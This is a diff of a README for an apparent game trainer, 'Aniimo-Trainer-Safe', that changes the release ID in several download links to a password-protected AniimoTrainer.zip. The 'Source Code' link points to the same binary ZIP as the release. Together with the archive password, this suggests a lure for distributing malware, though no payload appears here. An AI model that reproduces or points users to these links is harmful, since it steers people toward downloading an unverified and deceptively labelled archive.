@@ -40,7 +40,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/810252/AniimoTrainer.zip">
+<a href="https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/9016728/AniimoTrainer.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -53,8 +53,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/810252/AniimoTrainer.zip)
-- [Source Code](https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/810252/AniimoTrainer.zip)
+- [Latest Release](https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/9016728/AniimoTrainer.zip)
+- [Source Code](https://github.com/iconspecialistsquare/Aniimo-Trainer-Safe/releases/download/9016728/AniimoTrainer.zip)
 
 > 💡 **Prefer a classic download?** Download the ZIP from the **Releases** section above and use the password below.
 >
